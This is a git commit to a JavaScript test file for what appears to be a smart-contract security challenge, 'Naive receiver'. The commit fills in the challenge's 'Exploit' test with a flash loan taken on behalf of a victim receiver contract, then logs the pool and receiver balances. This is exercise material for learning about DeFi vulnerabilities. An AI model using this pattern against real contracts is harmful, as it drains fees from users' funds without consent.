f1c9ad6a1d48476161bdfb0a32c6763d1f9952c5
JM <jalilmarkel1992@gmail.com>
2022-07-13 21:00:11 +0800

    unstoppable

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -19,18 +19,23 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('100'))
+        let pool_balance = await ethers.provider.getBalance(this.pool.address)
+        console.log('Pool', ethers.utils.formatEther(pool_balance))
+        let receiver_balance = await ethers.provider.getBalance(this.receiver.address)
+        console.log('Receiver', ethers.utils.formatEther(receiver_balance))
     });
 
     after(async function () {
